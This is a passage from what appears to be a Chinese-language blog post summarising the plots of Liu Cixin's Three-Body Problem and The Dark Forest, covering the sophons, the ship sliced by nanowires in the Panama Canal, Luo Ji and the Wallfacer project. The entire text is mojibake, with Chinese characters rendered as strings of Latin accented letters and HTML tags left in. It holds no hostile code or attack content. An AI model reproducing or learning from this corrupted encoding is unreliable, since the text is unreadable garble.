é€Ÿåˆ°æ¥è¿‘å…‰é€Ÿï¼Œåªè¦å››å¹´å¤šçš„æ—¶é—´ï¼Œå®ƒå°±å¯ä»¥ä»ä¸‰ä½“è¡Œæ˜Ÿè¾¾åˆ°åœ°çƒã€‚ä¸‰ä½“äººå¯¹å¾®è§‚ä¸–ç•Œçš„ç ”ç©¶è¿œè¶…äººç±»ï¼Œæ™ºå­çš„åˆ¶é€ åŸç†éå¸¸æ™¦æ¶©éš¾æ‡‚ï¼Œä¸‰ä½“çš„ç§‘å­¦å®¶å…ˆæŠŠå¤åˆç²’å­ä¸­çš„è´¨å­å±•å¼€æˆäºŒç»´ï¼Œç„¶ååœ¨è´¨å­å®è¾¾çš„äºŒç»´å±•å¼€é¢ä¸Šï¼Œæ­å»ºé›†æˆç”µè·¯ï¼Œåˆ¶é€ å¥½åï¼Œå†æŠŠå®ƒæ”¶ç¼©å›æ™®é€šè´¨å­çš„å¤§å°ï¼Œè¿™æ ·ï¼Œè¿™ä¸ªå¾®è§‚ç²’å­ï¼Œå°±å˜æˆäº†è¶…çº§æ™ºèƒ½è®¡ç®—æœºã€‚ç”±äºæ™ºå­çš„æ£ä¹±ï¼Œå›½é™…çŸ¥åç»„ç»‡ï¼Œç§‘å­¦è¾¹ç•Œé‡Œå¾ˆå¤šæ°å‡ºçš„ç§‘å­¦å®¶çº·çº·è‡ªæ€ï¼Œå¯è§ä¸‰ä½“äººæŠŠäººç±»ç§‘å­¦å®¶é€¼æˆä»€ä¹ˆæ ·äº†ã€‚ç»æ”¿åºœæœºæ„é‚€è¯·ï¼Œä¸€ä½äº”å¤§ä¸‰ç²—ï¼Œä¸€è„¸æ¨ªè‚‰ä¸ä¿®è¾¹å¹…çš„å²å¼ºè­¦å¯Ÿï¼Œå’Œä¸€åç ”ç©¶çº³ç±³ææ–™çš„æ±ªæ·¼æ•™æˆï¼Œå¼€å§‹è°ƒæŸ¥æ­¤äº‹ã€‚è‡ªæ€åå•ä¸­ï¼Œè¿˜åŒ…æ‹¬äº†å¶æ–‡æ´çš„å¥³å„¿æ¨å†¬ï¼Œå®¶äººå‘ç°äº†å¥¹æœç”¨äº†å¤§é‡å®‰çœ è¯ï¼Œæ­»åœ¨äº†åºŠä¸Šã€‚æ¨å†¬çš„ç”·å‹ä¸ä»ªï¼Œç»™æ±ªæ·¼ä»–ä»¬çœ‹äº†æ¨å†¬çš„é—ä¹¦ã€‚é—ä¹¦å¾ˆç®€çŸ­ä¹Ÿæ²¡ç­¾å­—ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œç‰©ç†å­¦ä»æ¥å°±æ²¡æœ‰å­˜åœ¨è¿‡ã€‚å°†æ¥ä¹Ÿä¸ä¼šå­˜åœ¨ã€‚æˆ‘çŸ¥é“è‡ªå·±è¿™æ ·åšæ˜¯ä¸è´Ÿè´£ä»»çš„ï¼Œä½†åˆ«æ— é€‰æ‹©ã€‚å²å¼ºå’Œæ±ªæ·¼è¿™ä¿©äººï¼Œä¸€å¼€å§‹åƒç£é“çš„ä¸¤ä¸ªæ­£æä¸€æ ·åˆä¸æ¥ï¼Œä½†åœ¨åæ¥çš„åˆä½œä¸­ï¼Œä¸¤äººäº§ç”Ÿäº†æ„Ÿæƒ…ã€‚æ­£åœ¨è°ƒæŸ¥çš„æ±ªæ·¼ï¼Œçœ¼å‰çªç„¶å‡ºç°äº†ä¸€ç»„æ¶ˆæ•£ä¸å»ï¼Œæ­£åœ¨å€’è®¡æ—¶çš„æ•°å­—ï¼Œè¿™ç»„å¹½çµå€’è®¡æ—¶å¯æŠŠæ±ªæ·¼æŠ˜è…¾æƒ¨äº†ï¼Œå½“ä»–æš‚åœäº†å·¥ä½œï¼Œå»æ¢æ±‚çœŸç›¸åå€’è®¡æ—¶æ¶ˆå¤±äº†ã€‚æ±ªæ·¼é€šè¿‡å°„ç”µæœ›è¿œé•œï¼Œå‘ç°äº†å®‡å®™è¾å°„èƒŒæ™¯ä¸‹çš„å€’è®¡æ—¶ï¼Œä»–ç›¸ä¿¡ä¸€å®šæœ‰æŸç§ç¥å¥‡çš„åŠ›é‡ï¼Œé™åˆ¶ç€äººç±»ç§‘å­¦ã€‚è¿™å…¶å®ä¹Ÿæ˜¯æ™ºå­æçš„é¬¼ã€‚å®ƒä¸ä»…èƒ½é™åˆ¶äººç±»çš„å¾®è§‚ç ”ç©¶ï¼Œè¿˜èƒ½å±•å¼€æˆäºŒç»´ï¼Œå¹²æ‰°äººç±»çš„å®è§‚ç ”ç©¶ã€‚ç»è¿‡æ·±å…¥çš„è°ƒæŸ¥ï¼Œæ±ªæ·¼ä»–ä»¬å‘ç°äº†ä¸€æ¬¾åå«ä¸‰ä½“çš„æ¸¸æˆã€‚è¿™æ¸¸æˆéå¸¸çœŸå®ï¼Œå…¶å†…å®¹éƒ½æ˜¯å°½é‡è¿˜åŸä¸‰ä½“äººçš„ç”Ÿæ´»ç¯å¢ƒï¼Œå‡ ç»æ³¢æŠ˜åï¼Œæ±ªæ·¼é€šå…³äº†æ¸¸æˆï¼Œæ”¶åˆ°äº†å‚åŠ ä¸‰ä½“ç©å®¶çº¿ä¸‹èšä¼šçš„æ¶ˆæ¯ã€‚è´Ÿè´£äººè¯¢é—®å„ä½ç©å®¶ï¼Œæ˜¯å¦åŒæ„ä¸‰ä½“äººé™ä¸´åœ°çƒï¼Œæ±ªæ·¼å‡è£…åŒæ„ï¼Œæ‰“å…¥äº†æ•Œäººå†…éƒ¨ï¼Œè¿›å…¥ç»„ç»‡å†…éƒ¨çš„æ±ªæ·¼æƒŠè®¶å‘ç°ï¼Œè¿™ä¸ªç»„ç»‡çš„ç²¾ç¥é¢†è¢–ï¼Œæ­£å¼æ¨å†¬å¹´è¿ˆçš„æ¯äº²å¶æ–‡æ´ã€‚ä¸ä¹…ä¹‹åï¼Œå²å¼ºæ±ªæ·¼é‡Œåº”å¤–åˆæŠŠåœ°çƒå›å†›è¿™ä¸ªç»„ç»‡æ‹¿ä¸‹äº†ï¼Œå¶æ–‡æ´è¢«æ´»æ‰ï¼Œéšåå¤§å®¶ä¾¿çŸ¥é“äº†ç¬¬äºŒçº¢å²¸åŸºåœ°è¿™è‰˜é‚®è½®çš„å­˜åœ¨ã€‚é¢å¯¹è¿™å¸®å›å¾’ï¼Œå¹²æ‰ä»–ä»¬æ˜¯å…¶æ¬¡çš„ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œè·å¾—ä»–ä»¬ä¸ä¸‰ä½“äººçš„èŠå¤©è®°å½•ã€‚æ¯•ç«Ÿä»èŠå¤©è®°å½•é‡Œï¼Œèƒ½æŒæ¡å¤§é‡çš„åœ°æ–¹æƒ…æŠ¥ï¼Œä¹Ÿèƒ½çŸ¥é“å¯¹æ‰‹çš„è¦å®³åœ¨å“ªã€‚</p><p>&emsp;&emsp;äººä»¬ä¸ºäº†æ‹¿åˆ°è¿™ä»½èŠå¤©è®°å½•ï¼Œè´¹äº†åƒè¾›ä¸‡è‹¦ï¼Œé¦–å…ˆä¸Šèˆ¹æŠ“æ˜¯ä¸é è°±çš„ï¼Œè¿™å¸®äººéƒ½æ˜¯äº¡å‘½å¾’ï¼Œéšæ—¶å¯èƒ½è·Ÿæ•°æ®èµ„æ–™åŒå½’äºå°½ï¼Œä¹Ÿä¸èƒ½å¯¹è¿™è‰˜èˆ¹è¿›è¡Œå†›äº‹æ‰“å‡»ï¼Œä¸‡ä¸€ç‚¸äº†ï¼Œé‚£å°±åŠŸäºä¸€ç¯‘äº†ã€‚åœ¨å®¡é—®ä¸­äººä»¬å¾—çŸ¥äº†ä¸€ä¸ªåƒè½½éš¾é€¢çš„å¥½æœºä¼šï¼Œè¿™è‰˜èˆ¹ä¼šåœ¨æŸä¸€å¤©ç»è¿‡å·´æ‹¿é©¬è¿æ²³ã€‚è¿™ä¸ªè¿æ²³æœ€çª„çš„åœ°æ–¹å°±150ç±³ï¼Œå²å¼ºæƒ³äº†ä¸ªæ³•å­ï¼Œåœ¨æ²³çš„ä¸¤è¾¹æ¶èµ·ä¸¤æ ¹é«˜é«˜çš„æ†å­ï¼Œåœ¨æ†å­ä¸Šæ‹‰èµ·äº†è¶…éŸ§æ€§çš„çº³ç±³çº§ç»†ä¸ï¼Œæ¯éš”50cmæ‹‰ä¸€æ ¹ï¼Œè¿™äº›çœ‹ä¸è§çš„ç»†ä¸ï¼Œé”‹åˆ©æ— æ¯”ã€‚å¦‚æœè¿™è‰˜èˆ¹ç©¿è¿‡è¿™ä¸ªçº³ç±³ç»†ä¸ç»„æˆçš„å¢™ï¼Œèˆ¹å’Œäººéƒ½ä¼šåƒåˆ‡è±†è…ä¸€æ ·è¢«åˆ‡å¼€ï¼Œèˆ¹ä¸Šçš„ä»»ä½•äººéƒ½æ¥ä¸åŠä»»ä½•åº”æ€¥æªæ–½ã€‚å½“ç„¶ï¼Œç”¨æ¥å‚¨å­˜å„ç§æ•°æ®çš„ç¡¬ç›˜ï¼Œä¹Ÿä¼šè¢«åˆ‡å¼€ï¼Œä¸è¿‡ä¼šè¢«åˆ‡çš„å¾ˆå¹³æ•´ï¼Œæ˜¯å¯ä»¥è¿˜åŸçš„ã€‚è¿™æ¬¡è¡ŒåŠ¨è¢«ç§°ä¸ºå¤ç­è®¡åˆ’ã€‚å¤ç­è®¡åˆ’éå¸¸æˆåŠŸï¼Œè¿™è‰˜èˆ¹åƒä¸€å æ‰‘å…‹ç‰Œä¸€æ ·ï¼Œåˆ·çš„ä¸€ä¸‹å°±åˆ†å¼€äº†ï¼Œå˜æˆäº†åƒå±‚ç³•ï¼Œèˆ¹è¢«åˆ‡æˆäº†50å˜ç±³çš„è–„ç‰‡ï¼Œä¼Šæ–‡æ€ä¹Ÿè¢«åˆ‡æˆäº†ä¸‰æ®µã€‚äººä»¬åœ¨èˆ¹çš„åºŸå¢Ÿé‡Œï¼Œæ‰¾åˆ°äº†æƒ³è¦çš„èµ„æ–™ï¼Œä¸€å…±æœ‰28ä¸ªGï¼Œäººä»¬ä»”ç»†ç ”ç©¶äº†è¿™äº›èµ„æ–™ï¼Œå¾—åˆ°äº†ä¸¤ä¸ªéå¸¸é‡è¦çš„æƒ…æŠ¥ã€‚</p><p>&emsp;&emsp;ä¸€ä¸ªå¤§çš„åæ¶ˆæ¯æ˜¯ï¼Œæ™ºå­é™¤äº†å°é”äººç±»ç§‘æŠ€å‘å±•ï¼Œå®ƒè¿˜æ˜¯ä¸ªè¶…çº§ç›‘è§†å™¨ï¼Œå®ƒåˆ©ç”¨è‡ªå·±çš„å…‰é€Ÿç§»åŠ¨èƒ½åŠ›ç›‘è§†æ‰€æœ‰äººï¼Œå¹²æ‰°å„åˆ«ç§‘å­¦å®¶çš„è§†ç¥ç»ï¼Œæ¯ä¸€ä¸ªäººç±»è¯´çš„æ¯ä¸€å¥è¯ï¼Œåšçš„æ¯ä¸€ä»¶äº‹ï¼Œä¸‰ä½“äººéƒ½åœ¨å…¨ç¨‹çœ‹ç›´æ’­ã€‚å¦‚æ­¤é‡è¦çš„æƒ…æŠ¥ï¼Œè®©äººç±»çŸ¥é“ä»»ä½•å¼€ä¼šè®¨è®ºå‡ºæ¥çš„è®¡åˆ’ï¼Œéƒ½ä¼šè¢«ä¸‰ä½“äººçŸ¥é“ã€‚å¤ç­è®¡åˆ’çš„æˆåŠŸï¼Œå…¶å®æ˜¯ä¸‰ä½“äººä¸ºäº†å€Ÿäººç±»çš„æ‰‹ï¼Œæ¶ˆç­è¿™å¸®åœ°çƒå›å†›çš„è®¡åˆ’ã€‚å› ä¸ºä¸‰ä½“äººçš„æ€æƒ³æ˜¯é€æ˜çš„ï¼Œä»–ä»¬é€šè¿‡æ€ç»´ç›´æ¥äº¤æµï¼Œä¸ä¼šæ’’è°ï¼Œå½“ä»–ä»¬å¾—çŸ¥äººç±»æœ‰æ’’è°è¿™ä¸ªæŠ€èƒ½åï¼Œéå¸¸çš„ææƒ§ã€‚äººç±»åœ¨å¾—çŸ¥æœ‰æ™ºå­è¿™ä¸ªä¸œè¥¿åï¼Œæ™ºå­å°±ä¸èƒ½å†å¹²æ‰°äººç±»çš„å®è§‚è§‚æµ‹äº†ï¼Œå› ä¸ºå®ƒä¸€æ—¦åœ¨å±•å¼€æˆäºŒç»´ï¼Œå°±å¾ˆå¯èƒ½è¢«äººç±»æ¶ˆç­ã€‚ä¹‹å‰æ±ªæ·¼å’Œä¸€äº›ç§‘å­¦å®¶çœ¼å‰çš„å¹½çµå€’è®¡æ—¶ï¼Œå°±æ˜¯æŒ‡åœ¨åœ¨äººè§†ç½‘è†œä¸Šæçš„æŠŠæˆã€‚ç¬¬äºŒä¸ªæƒ…æŠ¥æ˜¯ï¼Œåœ¨åœ°çƒä¸Šä¸‰ä½“äººæ€•ä¸€ä¸ªäººç±»ï¼Œè€Œä¸”åªæ€•è¿™ä¸€ä¸ªäººï¼Œåœ°çƒå›å†›æ›¾ç»å¤šæ¬¡æƒ³è¦æ€æ­»ä»–ï¼Œè¿™ä¸ªäººï¼Œå°±æ˜¯ç½—è¾‘ã€‚</p><p>&emsp;&emsp;è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœå‘ç°ç»„ç»‡é‡Œæœ‰å›å¾’ï¼Œæœ€å…³é”®çš„ä¸æ˜¯æ¶ˆç­å®ƒï¼Œè€Œæ˜¯è·å–æ•Œæ–¹é«˜ä»·å€¼çš„ä¿¡æ¯ï¼Œå¦‚æœå›å¾’è¿™ä¸ªæ£‹å­ç”¨çš„å¥½ï¼Œä½ ä¼šæ¯”æ•Œäººæ›´æœ‰åˆ©ã€‚</p><p>&emsp;&emsp;åæ¥äººç±»æ‰€å‘å±•çš„æ‰€æœ‰æˆ˜ç•¥ï¼Œ éƒ½æ˜¯åŸºäºè¿™ä¸¤ä¸ªä¿¡æ¯ï¼šåœ°çƒä¸Šæœ‰ä¸ªå«æ™ºå­çš„æœºå™¨äººåœ¨æ£ä¹±ï¼Œå’Œä¸‰ä½“æƒ³æ€ä¸€ä¸ªå«ç½—è¾‘çš„ç”·äººã€‚äººä»¬ç´§æ€¥å¬å¼€äº†å›½é™…ä¼šè®®ï¼Œè®¨è®ºå¦‚ä½•åº”å¯¹å±æœºï¼Œæ­¤æ—¶ä¸‰ä½“äººé€šè¿‡æ™ºå­ï¼Œç»™æ¯ä¸ªäººçœ¼å‰æ˜¾ç¤ºå‡ºäº†ç›¸åŒçš„æ–‡å­—ï¼Œä½ ä»¬æ˜¯è™«å­ã€‚</p><p>&emsp;&emsp;å½“å…¨ä¸–ç•Œçš„äººå¾—çŸ¥æ­¤æ¶ˆæ¯åï¼Œä¾¿å¼€å§‹é™·å…¥äº†ç»æœ›ï¼Œæ±ªæ·¼åœ¨å¾—çŸ¥æ•´ä¸ªäº‹æƒ…çš„æ¥é¾™å»è„‰åï¼Œå’Œæ¨å†¬çš„ç”·å‹ä¸ä»ªå€Ÿé…’æ¶ˆæ„ã€‚ä¸¤ä½ç§‘å­¦å®¶æ„Ÿå¹ç€äººç±»åœ¨ä¸‰ä½“äººçœ¼é‡Œå°±æ˜¯è™«å­ï¼Œè¿˜æ˜¯å³å°†ç­ç»çš„è™«å­ï¼Œä»–ä»¬è€ç€é…’ç–¯å¤§å–Šé“ï¼Œæœ«æ—¥ä¸‡å²ï¼Œè™«å­ç‹ä¸‡å²ï¼Œæ™ºå­ä¸‡å²ã€‚å²å¼ºçœ‹åˆ°åä¸ºäº†ç»™ä»–ä»¬å¤§æ°”ï¼Œè®©ä»–ä»¬æŒ¯ä½œï¼ŒæŠŠä¿©äººå¸¦åˆ°äº†ä¸€ç‰‡éº¦åœ°ï¼Œä»–ä»¬æ³¨è§†ç€éº¦ç”°ï¼Œè—è™«åœ¨è¿™ç‰‡éº¦åœ°æ¼«å¤©é£èˆï¼Œåƒæ²™å°˜æš´å•ƒé£Ÿç€åº„ç¨¼ï¼Œä¸¤äººçœ‹åˆ°è¿™ä¸€å¹•å¿ƒæœ‰æ‰€æƒ³ï¼Œäººç±»ä¸è—è™«ç§‘æŠ€ä¹‹é—´çš„å·®è·ï¼Œæ¯”äººç±»å’Œä¸‰ä½“äººä¹‹é—´å¤§å¤šäº†ã€‚æˆ‘ä»¬ç”¨é£æœºå–·æ´’å„ç§æ€è™«å‰‚ï¼ŒåŸ¹è‚²ä»–ä»¬çš„å¤©æ•Œï¼Œæ— æ‰€ä¸ç”¨å…¶æåœ°æƒ³æ¶ˆç­ä»–ä»¬ï¼Œä½†ä»–ä»¬ç¿±ç¿”äºå¤©åœ°ä¹‹é—´ï¼Œæ²¡æœ‰è¢«ç­ç»ã€‚æŠŠäººç±»çœ‹æˆè™«å­çš„ä¸‰ä½“ï¼Œä¼¼ä¹å¿˜è®°äº†ä¸€ä¸ªäº‹å®ï¼Œè™«å­è™½ç„¶å¾ˆå¼±å°ï¼Œä½†ä»æ¥æ²¡æœ‰è¢«çœŸæ­£æ¶ˆç­è¿‡ï¼Œä¸‰äººæ²æµ´åœ¨è¿™ç”Ÿå‘½çš„æš´é›¨ä¸­ï¼Œæ„Ÿå—ç€åœ°çƒç”Ÿå‘½çš„å°Šä¸¥ã€‚æ±ªæ·¼å’Œä¸ä»ªæŠŠæ‰‹ä¸­æ‹è¿™çš„é…’æ…¢æ…¢æ´’åœ¨è„šä¸‹ï¼Œä»–ä»¬è¯´ï¼Œè¿™ï¼Œæ˜¯æ•¬è™«å­çš„ã€‚</p><h3 id="é»‘æš—æ£®æ—"><a href="#é»‘æš—æ£®æ—" class="headerlink" title="é»‘æš—æ£®æ—"></a>é»‘æš—æ£®æ—</h3><p>&emsp;&emsp;ä¹¦çš„å¼€ç¯‡å€Ÿç”¨ä¸€åªè¤èšï¼Œåœ¨å¶æ–‡æ´å¥³å„¿æ¨å†¬çš„å¢“ç¢‘ä¸Šçˆ¬è¡Œï¼Œå¼•å‡ºäº†ä¸€æ®µå¾€äº‹ã€‚ä¸Šæœ¬ä¹¦çš„ä¸»è§’å¶æ–‡æ´å’Œæ–°ä¸»è§’ç½—è¾‘ï¼Œåœ¨å¶æ–‡æ´çš„å¥³å„¿æ¨å†¬å¢“å‰è§é¢ï¼Œæ–°ä¸»è§’ç½—è¾‘æ˜¯æ¨å†¬çš„é«˜ä¸­åŒå­¦ï¼Œå¾ˆèªæ˜ï¼Œä½†èƒ¸æ— å¤§å¿—ï¼Œä»¥å‰æ˜¯æå¤©æ–‡å­¦çš„ï¼ŒçŠ¹è±«ä¸å¥½æ··ç°åœ¨æ”¹è¡Œæ•™ç¤¾ä¼šå­¦ã€‚å¶æ–‡æ´ç»™å‡ºäº†ä¸€æ¡å»ºè®®ï¼Œè®©ä»–æŠŠè¿™ä¸¤ä¸ªä¸“ä¸šç»“åˆï¼Œåšå‡ºï¼Œå®‡å®™ç¤¾ä¼šå­¦ã€‚å¹¶ç»™å‡ºäº†ä¸¤æ¡å®‡å®™ç¤¾ä¼šå­¦çš„å…¬ç†ï¼šç¬¬ä¸€ï¼Œç”Ÿå­˜æ˜¯æ–‡æ˜çš„ç¬¬ä¸€éœ€è¦ï¼›ç¬¬äºŒï¼Œæ–‡æ˜ä¸æ–­å¢é•¿å’Œæ‰©å¼ ï¼Œä½†å®‡å®™çš„ç‰©è´¨æ€»é‡ä¿æŒä¸å˜ã€‚å’Œä¸¤ä¸ªé‡è¦æ¦‚å¿µï¼ŒçŒœç–‘é“¾å’ŒæŠ€æœ¯çˆ†ç‚¸ã€‚è¯´å®Œè¿™äº›ï¼Œå¶æ–‡æ´ä¾¿åŒ†åŒ†çš„ç¦»å¼€äº†ã€‚ç¦»åˆ«æ—¶è‡ªè¨€è‡ªè¯­é“ï¼Œæˆ‘å°½äº†è´£ä»»ã€‚</p><p>&emsp;&emsp;æ—¶å…‰èè‹’ï¼Œå¤šå¹´è¿‡åï¼Œäººç±»å·²ç»çŸ¥é“ä¸‰ä½“åœ¨400å¹´åå³å°†é™ä¸´ï¼Œä¸–ç•Œå„å›½æ”¿åºœè¿›å…¥äº†å¤‡æˆ˜çŠ¶æ€ï¼Œå‡†å¤‡é½å¿ƒåˆåŠ›ä¿å«å®¶å›­ã€‚ç”±æ­¤å¼€å§‹äº†ï¼Œå±æœºçºªå…ƒã€‚ä¸–ç•Œä¸Šæ­£å‘ç”Ÿç€è¿™å‡ ä»¶å¤§äº‹ï¼Œç¬¬ä¸€ä»¶ï¼Œè§„åˆ’ç»„ä»¶å¤ªç©ºå†›ã€‚åœ¨è¿™æ”¯å¤ªç©ºå†›é‡Œï¼Œæœ‰ä¸€ä½ä¸»è§’ï¼Œç« åŒ—æµ·ï¼Œä»–æ˜¯å†›äººä¸–å®¶ã€‚åœ¨å¤–äººçœ¼é‡Œï¼Œä»–åšä¿¡äººç±»å¿…èƒœï¼Œæ”¶åˆ°ç»„ç»‡é«˜åº¦é‡è§†ã€‚åæ¥å¤ªç©ºå†›é€‰å‡ºäº†ä¸€æ‰¹ä¿¡ä»°åšå®šçš„å†›äººå†¬çœ ï¼Œå»å¢æ´æœ«æ—¥ä¹‹æˆ˜ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ä»–ã€‚ç¬¬äºŒä»¶ï¼Œå…¨çƒæŠ€æœ¯å…¬æœ‰åŒ–ï¼Œè”åˆå›½é€æ¸æˆä¸ºä¸–ç•Œæ”¿åºœï¼Œå›½å®¶çš„è¾¹ç•Œå¼€å§‹æ¨¡ç³Šï¼Œåœ°çƒä¸Šå‡ºç°äº†é€ƒäº¡ä¸»ä¹‰ï¼Œä»–ä»¬è®¤ä¸ºï¼Œåœ°çƒç§‘æŠ€å·²è¢«é”æ­»ï¼Œèµ°å‡ºå¤ªé˜³ç³»ï¼Œå¯»æ‰¾æ–°å®¶å›­æ‰èƒ½å»¶ç»­ä¸‹å»ã€‚ä½†æ¯•ç«Ÿèµ„æºæœ‰é™ï¼Œå¤§å¤šæ•°äººè¦ç•™åœ¨åœ°çƒä¸Šã€‚ä¸ä¹…ä¹‹åï¼Œäººäººå¹³ç­‰çš„å£å·å“å½»åœ°çƒï¼Œè”åˆå›½ä¸€è‡´å†³å®šï¼Œè¦æ­»ä¸€èµ·æ­»ï¼Œåšå†³åå¯¹é€ƒäº¡ä¸»ä¹‰ã€‚ä¸€æ—¶é—´ï¼Œä¿å«å®¶å›­ï¼Œç»ä¸é€ƒç¦»ï¼Œæˆä¸ºäº†ä¸–ç•Œçš„ä¸»æ—‹è·¯ä»¥åŠæ”¿æ²»æ­£ç¡®ã€‚</p><p>&emsp;&emsp;ç”»é¢ä¸€è½¬ï¼Œç½—è¾‘è¿™ä½èŠ±èŠ±å…¬å­ï¼Œå’Œä¸€ä½å¥³ä¼´åˆšä»å®¾é¦†å‡ºæ¥ï¼Œçªç„¶ä¸€è¾†ç–¾é©°çš„è½¦å‘ä»–ä»¬æ’æ¥ï¼Œæ°å¥½è¢«æ¶ˆé˜²æ “ç»Šå€’çš„ç½—è¾‘ï¼Œä¾¥å¹¸é€ƒè¿‡ä¸€åŠ«ã€‚ä½†å¥³ä¼´å´è¢«å½“åœºæ’æ­»ã€‚ç½—è¾‘ä»¥ä¸ºè¿™æ˜¯æ„å¤–ï¼Œä»–ä¸çŸ¥é“è¿™æ˜¯ä¸‰ä½“äººç»™åœ°çƒå›å†›ä¸‹è¾¾çš„æš—æ€å‘½ä»¤ã€‚ä¸æ˜çœŸç›¸çš„ç½—è¾‘è¢«è­¦åŠ¡äººå‘˜å¸¦è¿›äº†ä¸€ä¸ªåœ°ä¸‹åå±‚çš„å°æˆ¿å­é‡Œï¼Œåœ¨è¿™ï¼Œä»–ä¸ä¸Šæœ¬ä¹¦ä¸­çš„å²å¼ºç›¸è¯†äº†ã€‚éšåï¼Œç½—è¾‘è¢«å¤§æ‰¹æ­¦è£…éƒ¨é˜ŸæŠ¤é€ä¸Šäº†é£æœºï¼Œåœ¨å¤šæ¶æ­¼å‡»æœºçš„æŠ¤èˆªä»¥åŠæ•°åä¿é•–çš„æŠ¤é€ä¸‹ï¼Œç½—è¾‘å®‰å…¨æŠµè¾¾äº†è”åˆå›½ä¼šåœºï¼Œè¿™çªå¦‚å…¶æ¥çš„å¤§åœºé¢ï¼Œæ¢åœ¨è°èº«ä¸Šéƒ½å¾—è’™åœˆã€‚å¤§ä¼šä¸Šè”åˆå›½ç§˜ä¹¦é•¿ï¼Œå®£å¸ƒäº†é¢å£è€…è®¡åˆ’ã€‚é¢å£è®¡åˆ’æ˜¯åŸºäºè¿™ä¸¤ä¸ªä¸»è¦æƒ…æŠ¥äº§ç”Ÿçš„ï¼šä¸€ã€åœ°çƒåœ¨ä¸‰ä½“äººé‚£å·²ç»å®Œå…¨é€æ˜äº†ï¼Œä»»ä½•äº¤æµã€ä¼šè®®éƒ½å˜æˆäº†ç°åœºç›´æ’­ï¼›äºŒã€ä¸‰ä½“äººçš„å¼±ç‚¹åœ¨äºä¸æ‡‚è¯´è°ï¼Œåœ¨ä»–ä»¬çš„ä¸–ç•Œé‡Œæ²¡æœ‰é˜´è°‹ã€æš—ç®—è¿™äº›è¯ã€‚é¢å£è®¡åˆ’çš„æ ¸å¿ƒåœ¨äºï¼Œé€‰å‡ºå››ä¸ªæˆ˜ç•¥è®¡åˆ’çš„åˆ¶å®šè€…å’Œé¢†å¯¼è€…ï¼Œä»–ä»¬å®Œå…¨æŒ‰ç…§è‡ªå·±çš„æ€ç»´åˆ¶å®šè®¡åˆ’ï¼Œä¸ä¸å¤–ç•Œäº¤æµï¼Œè®¡åˆ’çœŸæ­£çš„ç›®çš„å’Œæ„å›¾éƒ½è—äºä»–ä»¬çš„å¤§è„‘ã€‚ä»–ä»¬æ‰€è¡¨ç°å‡ºæ¥çš„è¡Œä¸ºåº”è¯¥æ˜¯æ¬ºéª—æ•Œäººã€‚è¿™å››äººè¢«ç§°ä¹‹ä¸ºï¼Œé¢å£äººã€‚é¢å£äººæ‹¥æœ‰æœ€é«˜æƒåŠ›å»è°ƒé›†åœ°çƒèµ„æºï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨ä¸–ç•Œä¸Šé€‰å‡ºå››ä¸ªæœ‰èƒ½åŠ›çš„å¤§éª—å­ï¼Œå»éª—ä¸‰ä½“äººã€‚</p><p>&emsp;&emsp;ç§˜ä¹¦é•¿å…¬å¸ƒäº†é¢å£è€…åå•ã€‚ç¬¬ä¸€ä½é¢å£è€…æ˜¯åˆšåˆšå¸ä»»çš„ç¾å›½å›½é˜²éƒ¨éƒ¨é•¿ï¼Œæ³°å‹’ï¼›ç¬¬äºŒä½æ˜¯å§”å†…ç‘æ‹‰ç°ä»»æ€»ç»Ÿï¼Œé›·è¿ªäºšå…¹ï¼›ç¬¬ä¸‰ä½æ˜¯ä¸–ç•ŒçŸ¥åè„‘ç§‘å­¦å®¶ï¼Œå¸Œæ©æ–¯ï¼›ç¬¬å››ä½æ˜¯ï¼Œç½—è¾‘ã€‚ç½—è¾‘å¬åˆ°è‡ªå·±åå­—åå·®ç‚¹æ™•è¿‡å»ã€‚å„å›½é¢†å¯¼äººï¼Œå’Œä¸–ç•ŒçŸ¥åäººç‰©ï¼Œé½åˆ·åˆ·åœ°ç›¯ç€ä»–ã€‚ç½—è¾‘è¢«æ€æ‰¶åˆ°äº†ä¸»å¸­å°ä¸Šã€‚å¤§è„‘ä¸€ç‰‡ç©ºç™½çš„ç½—è¾‘åœ¨æ•£ä¼šåæ‰å›è¿‡ç¥ï¼Œä»–è®¤ä¸ºè¿™æ˜¯æé”™äº†ï¼Œä¸æ–­åœ°å‘æ‰€æœ‰äººæ‹’ç»è‡ªå·±é¢å£äººçš„èº«ä»½ã€‚è€Œæ‰€æœ‰äººéƒ½ä»¥ä¸ºï¼Œä»–ï¼Œå·²ç»å¼€å§‹æ¼”æˆäº†ã€‚</p><p>&emsp;&emsp;å½“ä»–ä¸€äººå†²å‡ºå¤§ä¼šåï¼Œåˆé­åˆ°äº†æš—æ€ï¼Œè¢«ç‹™å‡»æ‰‹ä¸€æªæ’‚å€’ã€‚å¥½åœ¨ä»–ä¸€è·¯ä¸Šéƒ½ç©¿ç€é˜²å¼¹è¡£ï¼Œè¿™ä¹‹åç½—è¾‘ä¸€ç›´è¢«ä¿æŠ¤ç€ï¼Œæ…¢æ…¢åœ°ï¼Œç½—è¾‘ä¹Ÿæƒ³é€šäº†ã€‚æ—¢ç„¶è‡ªå·±æ²¡æ³•è¾èŒï¼Œä¸å¦‚åˆ©ç”¨ç‰¹æƒå¥½å¥½äº«å—äººã€‚æ­£å½“å…¶ä»–é¢å£è€…æ®šç²¾ç«­è™‘ï¼Œç»å°½è„‘æ±ï¼Œå‡†å¤‡å¤§å¹²ä¸€åœºæ—¶ï¼Œç½—è¾‘çš„è¦æ±‚åœ¨è”åˆå›½çœ¼é‡Œéå¸¸å¥‡ç‰¹ï¼Œ 